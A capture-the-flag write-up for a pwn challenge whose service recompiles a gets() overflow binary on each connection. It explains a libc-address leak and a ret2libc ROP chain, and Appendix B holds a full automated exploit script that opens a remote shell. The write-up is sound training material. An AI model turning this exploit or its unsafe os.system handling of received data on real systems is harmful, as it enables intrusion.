@@ -1,0 +1,380 @@
+"I've seen some teams solve pwn challenges almost instantly.  I'm sure y'all
+wonder how.  Well, you're about to find out!"
+
+Category:       pwn (200 points)
+Chall author:   Eth007
+Writeup author: malfurious
+
+
+
+Setup
+-----
+We are provided with a Python script, as well as an address to contact the
+vulnerable service over TCP/netcat.  See Appendix A for the original script.
+See Appendix B for my automated solution.
+
+
+
+The Service
+-----------
+We can see the service generates a very simple C program on the backend:
+
+int main(void) {
+    char inp[RANDOM_SIZE];
+    setvbuf(stdout,NULL,2,0);
+    setvbuf(stdin,NULL,2,0);
+    gets(inp);                  // <-- Vulnerable function
+    puts("Thanks!");
+}
+
+Each time the script is run, this program is created with a random inp buffer
+size between 20 and 1000.  The service then compiles the program and converts
+the binary file to base64 text to deliver to the user.
+
+After sending the executable to the user, the service runs it, redirecting all
+standard IO from the user into it.  This is our opportunity to pwn the system.
+
+A short 10 second timer will interrupt the service and disconnect us if we are
+still connected.  If we reconnect, we will be working with a brand new binary,
+so the exploit needs to be automated and occur during a single session.
+
+
+
+The Binary
+----------
+The binary is compiled for x86_64 and done so using -fno-stack-protector and
+-no-pie.  Therefore, we shouldn't need to worry about stack canaries and can
+assume executable code address will be fixed.  Some simple experimentation
+determined that ASLR is _probably_ enabled in the remote environment, so no such
+assumption can be made about most of the address space.  Additionally, stack
+execution protection (NX) is in effect, so simple shellcode is off the table.
+
+
+
+Ideas
+-----
+After realizing shellcode was not going to be an option, there were two
+strategies I wanted to attempt to solve this problem.  Both of them utilizing
+Return-oriented programming (ROP).
+
+First: Use a ROP chain to implement the original shellcode (or a variant of it).
+This prooved very difficult given our limited access to machine code in the
+main binary.  There was one useful gadget found in the binary near the end of
+code under the __libc_csu_init symbol, at address 0x40120b; that being:
+
+    5f      pop $rdi
+    c3      ret
+
+The randomness to the main() function's buffer didn't affect the offset of these
+instructions, and since the code was not position-independent, the address was
+reliable.  This gadget will come in handy for the soultion, since x86_64 uses
+the rdi register to pass the first argument to a function call.
+
+Second: Use a ROP chain to return to libc to call system("/bin/sh").  Due to
+ASLR, we had no relaible address of any system library code, but we could
+obtain them using a technique to leak libc addresses.
+
+
+
+Leaking libc
+------------
+We can leak the version of the libc running on the remote system by determining
+the relative offsets of a couple of its functions.  We only have any sort of
+reference to a couple of functions, these being the ones actually called by the
+original program: setvbuf(), gets(), and puts().
+
+Although the runtime location of libc functions will be randomized due to ASLR,
+the PLT and GOT sections utilized directly by the executable will be fixed since
+it is compiled position-dependent.
+
+To leak the address of any function for which we have a PLT/GOT pair, we just
+need to call some print function with the address of the GOT section (which
+holds the dynamic address) as its argument *after* a call to said function has
+already occurred.  We need to wait until after the first call, so that the GOT
+section's pointer can be initialized properly.  In this case, we call puts(),
+since that is the only apropos function available.
+
+It was during working on this problem I learned about online libc databases.
+An example: https://libc.blukat.me/.  Services like this one will allow you to
+give the observed addresses of two or more libc functions, and use their
+relative offsets to cross-reference which version of libc they must come from.
+With knowledge of the original libc build, one can simply lookup the offset of
+any other symbol or even download the version in question to perform additional
+analysis on their own.
+
+
+
+Dynamically-sized Payload
+-------------------------
+We need to deal with the fact that the program is recompiled with a different
+buffer size each time we try to interact with it.  My automated solution
+does this by decoding and disassembling the data it receives on start-up.
+
+    data = recv_bin(sock)
+    os.system(f"printf '{data}' | base64 -d >pyelf")
+    os.system(f"objdump -d pyelf | grep lea | sed '1q' > pyelf.ofs")
+
+    # produces ...
+      401189:       48 8d 85 e0 fe ff ff    lea    -0x120(%rbp),%rax
+
+This just _happens_ to work in this case because the first lea instruction
+encountered in the binary is the one used to grab the buffer address for gets().
+
+From there I use a regex to grap the '120' offset value.  This is the offset
+(in hex) from the start of the buffer to the base of the stack frame and is used
+later for payload generation.
+
+
+
+ROP Solution - part 1
+---------------------
+A preliminary attack was required to leak the libc version.  The following ROP
+chain / payload was prepaired:
+
+    [padding]                   Enough data to fill space between start of inp buffer and the bottom of the stack frame
+    [saved rbp placeholder]     An 8-byte value to be consumed by the leave instruction at the end of main()
+    (ret) 0x40120b              Return address: Pointer to the "pop $rdi, ret" ROP gadget
+    0x00404018                  Value to pop into $rdi (Pointer to puts() GOT section)
+    (ret) 0x00401030            Return address: Pointer to puts() PLT - Effectively calling puts(&puts);
+    (ret) 0x40120b              Return address: Pointer to the "pop $rdi, ret" ROP gadget
+    0x00404028                  Value to pop into $rdi (Pointer to setvbuf() GOT section)
+    (ret) 0x00401030            Return address: Pointer to puts() PLT - Effectively calling puts(&setvbuf);
+    "\n"                        Newline character to terminate input to C gets() function call in main()
+
+If this payload is fed into the service, the binary addresses of functions
+puts() and setvbuf() will be output after the "Thanks!" string.  They can be
+used to lookup the libc in use.
+
+puts    = 0x7f0443fcb910
+setvbuf = 0x7f0443fcbf90
+libc6_2.28-10_amd64
+
+From this we can determine the following offsets from libc base:
+
+puts function    = 0x071910
+system function  = 0x0449c0
+"/bin/sh" string = 0x181519
+
+ASLR will randomize the location of libc base, but by re-leaking the address of
+puts() in followup attacks, we can use these known offsets to calculate full
+addresses.
+
+
+
+ROP Solution - part 2
+---------------------
+We are now ready to pwn the system.  We need to prepare two payloads and get
+the binary to read them both separately since we need to re-leak the randomized
+puts() function address.  So, the final step of the ROP chain for payload zero
+is to jump back to _start - to re-initialize the stack and run main() again.
+
+Here is the first payload: all fixed addresses were taken directly from the
+compiled binary.
+
+    [padding]                   Same junk data as before, possibly different length
+    [saved rbp placeholder]     Same placeholder as before
+    (ret) 0x40120b              Return address: Pointer to the "pop $rdi, ret" ROP gadget
+    0x00404018                  Value to pop into $rdi (Pointer to puts() GOT section)
+    (ret) 0x00401030            Return address: Pointer to puts() PLT - Effectively calling puts(&puts);
+    (ret) 0x00401060            Return address: Pointer to _start entry-point
+    "\n"                        Terminate input
+
+After sending this, the service prints the new address of puts() after the
+"Thanks!" string.  We need to pause here to get this address to calculate
+addresses for system() and "/bin/sh".  The program should have jumped back to
+main() and is ready for our second payload (within the same session).
+
+    [padding]                   Same junk data, required length same as previous in part 2
+    [saved rbp placeholder]     Same placeholder
+    (ret) 0x40120b              Return address: Pointer to the "pop $rdi, ret" ROP gadget
+    [binsh address]             Value to pop into $rdi (Calculated pointer to "/bin/sh" string)
+    (ret) [system address]      Return address: Calculated pointer to system() function - Calling system("/bin/sh")
+    "\n"                        Terminate input
+
+After sending this, the service has forked and dropped into a shell.  The flag
+is in flag.txt
+
+    cat flag.txt
+    ictf{4ut0m4t1ng_expl0it_d3v????_b7d75e95}
+
+
+
+================================================================================
+= Appendix A: 4E9F-speedrun.py                                                 =
+================================================================================
+#!/usr/bin/env python3
+
+import os
+import sys
+import subprocess
+import base64
+import random
+import uuid
+import time
+
+code1 = '''
+#include <stdio.h>
+
+int main(void) {
+        char inp['''
+
+code2 = '''];
+        setvbuf(stdout,NULL,2,0);
+        setvbuf(stdin,NULL,2,0);
+        gets(inp);
+        puts("Thanks!");
+}
+'''
+
+art = '''
+██████████████████████████
+█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
+█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
+█▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░█
+█▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░█
+█░░░██████▒▒▒░░░██████▒▒▒█
+█░░░██████▒▒▒░░░██████▒▒▒█
+█▒▒▒██████░░░▒▒▒██████░░░█
+█▒▒▒██████░░░▒▒▒██████░░░█
+█░░░▒▒▒░░░██████▒▒▒░░░▒▒▒█
+█░░░▒▒▒░░░██████▒▒▒░░░▒▒▒█
+█▒▒▒░░░████████████▒▒▒░░░█
+█▒▒▒░░░████████████▒▒▒░░░█
+█░░░▒▒▒████████████░░░▒▒▒█
+█░░░▒▒▒████████████░░░▒▒▒█
+█▒▒▒░░░███░░░▒▒▒███▒▒▒░░░█
+█▒▒▒░░░███░░░▒▒▒███▒▒▒░░░█
+█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
+█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
+██████████████████████████
+'''
+
+def compile(size):
+        filename = "/tmp/bin" + str(uuid.uuid4())
+        open(filename + ".c", "w").write(code1 + str(size) + code2)
+        subprocess.run(["gcc", "-o", filename, filename + ".c", "-fno-stack-protector", "-no-pie"], capture_output=True)
+        os.remove(filename + ".c")
+        return filename
+
+def handler(signum, frame):
+    print("Out of time!")
+
+filename = compile(random.randint(20,1000))
+binary = base64.b64encode(open(filename, "rb").read()).decode()
+print(art)
+print("I'll see you after you defeat the ender dragon!")
+
+time.sleep(3)
+
+print("---------------------------BEGIN  DATA---------------------------")
+print(binary)
+print("----------------------------END  DATA----------------------------")
+
+subprocess.run([filename], stdin=sys.stdin, timeout=10)
+os.remove(filename)
+
+
+
+================================================================================
+= Appendix B: speedrun_solution.py                                             =
+================================================================================
+import socket
+import re
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+s.connect(("chal.imaginaryctf.org", 42020))
+
+#'  401189:       48 8d 85 f0 fe ff ff    lea    -0x110(%rbp),%rax'
+p = re.compile('-0x(.*)\(%rbp\)')
+
+def pp(i):
+    return i.to_bytes(8, 'little')
+
+def gp(i):
+    return int.from_bytes(i, 'little', signed=False)
+
+def recv_pre(sock):
+    data = b''
+    while True:
+        data += sock.recv(20)
+        if b'-------' in data:
+            while True:
+                b = sock.recv(1)
+                data += b
+                if b == b'\n':
+                    print(data.decode())
+                    return
+
+def recv_bin(sock):
+    data = b''
+    while True:
+        b = sock.recv(1)
+        if b == b'\n':
+            print("  [[data consumed by the collective]]")
+            return data.decode()
+        data += b
+
+# automated re
+recv_pre(s)
+data = recv_bin(s)
+os.system(f"printf '{data}' | base64 -d >pyelf")
+os.system(f"objdump -d pyelf | grep lea | sed '1q' > pyelf.ofs")
+ofs = open("pyelf.ofs", "r").read()
+print(ofs)
+for x in p.findall(ofs):
+    ofs = int(x, 16)
+    break
+print(ofs)
+
+# finish recv
+print(s.recv(4096).decode())
+
+# send payload
+rdi_gadget = 0x40120b
+puts_plt = 0x00401030
+puts_got = 0x00404018
+vbuf_plt = 0x00401050
+vbuf_got = 0x00404028
+_start   = 0x00401060
+
+puts_ofs = 0x071910
+syst_ofs = 0x0449c0
+binsh_ofs = 0x181519
+
+# First payload
+payload = (b"A"*ofs) + (b"B"*8)
+
+payload += pp(rdi_gadget) # puts(&puts)
+payload += pp(puts_got)
+payload += pp(puts_plt)
+
+payload += pp(_start)     # jmp _start
+payload += b"\n"
+
+s.send(payload)
+get = s.recv(4096)
+print(get)
+get = get[8:-1] # strip 'Thanks!\n ... \n'
+leaked = gp(get)
+syst = leaked + syst_ofs - puts_ofs
+binsh = leaked + binsh_ofs - puts_ofs
+print(get)
+
+# Second payload
+payload = (b"A"*ofs) + (b"B"*8)
+
+payload += pp(rdi_gadget) # system("/bin/sh")
+payload += pp(binsh)
+payload += pp(syst)
+payload += b"\n"
+
+s.send(payload)
+get = s.recv(4096)
+print(get)
+
+#interactive
+while True:
+    cmd = input() + "\n"
+    s.send(cmd.encode())
+    print(s.recv(4096))
